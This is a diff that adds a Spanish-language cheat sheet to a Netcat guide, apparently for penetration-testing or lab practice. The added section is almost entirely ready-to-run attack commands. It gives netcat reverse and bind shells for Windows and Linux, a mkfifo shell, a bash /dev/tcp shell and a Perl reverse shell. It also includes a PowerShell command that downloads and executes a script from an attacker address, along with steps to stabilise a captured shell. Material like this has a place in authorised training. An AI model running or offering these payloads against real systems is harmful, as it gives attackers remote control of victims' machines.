@@ -84,3 +84,83 @@ nc 192.168.1.1 1234 < archivo_a_enviar.txt
 
 ## Conclusión
 Netcat es una herramienta esencial para auditorías de red y pruebas de penetración. Su versatilidad en la comunicación a través de redes lo convierte en una opción valiosa para tareas como escaneo de puertos, transferencia de archivos y conexiones remotas.
+
+---
+## **1. Tipos de Shells con Netcat**
+### **Reverse Shell** (la víctima se conecta al atacante)
+📌 Se usa cuando la víctima está detrás de un firewall/NAT y **no se puede acceder directamente**.  
+**Modo de uso:**  
+1. **El atacante escucha en un puerto** (ejemplo: 443)
+```bash
+nc -lvnp 443
+```
+
+2. **La víctima ejecuta Netcat y se conecta al atacante**  
+**En Windows:**
+```powershell
+nc64.exe -e cmd.exe 10.10.14.9 443
+```
+**En Linux:**
+```bash
+nc -e /bin/bash 10.10.14.9 443
+```
+
+**Si `-e` está deshabilitado** (Netcat moderno):
+```bash
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.9 443 > /tmp/f
+```
+### **Bind Shell** (el atacante se conecta a la víctima)
+📌 Se usa cuando se tiene acceso directo a la máquina víctima.  
+**Modo de uso:**  
+1. **La víctima abre una shell en un puerto**
+```bash
+nc -lvnp 4444 -e /bin/bash
+```
+
+2. **El atacante se conecta a la víctima**
+```bash
+nc 10.10.14.8 4444
+```
+
+🚨 **Problema:** Si un firewall bloquea conexiones entrantes, este método no funcionará.
+
+## **2. Payloads Alternativos**
+🔹 **Windows (PowerShell Reverse Shell)**
+```powershell
+powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.9/shell.ps1')"
+```
+
+🔹 **Bash Reverse Shell (Linux)**
+```bash
+bash -i >& /dev/tcp/10.10.14.9/443 0>&1
+```
+
+🔹 **Perl Reverse Shell**
+```perl
+perl -e 'use Socket;$i="10.10.14.9";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
+```
+
+## **3. Técnicas para estabilizar la shell**
+📌 Cuando obtenemos una shell, muchas veces está limitada. Para hacerla interactiva:
+1. 
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+2. 
+```bash
+export TERM=xterm
+```
+3. Hacemos `Ctrl + Z` para suspender la Shell
+4. 
+```bash
+stty raw -echo; fg
+```
+5. 
+```bash
+reset
+```
+
+## **4. Consideraciones de Seguridad**
+**Peligros de Netcat**
+- Puede ser detectado y bloqueado por antivirus y firewalls.
+- En entornos seguros, se recomienda usar herramientas como `ncat` o `socat` que permiten cifrado.
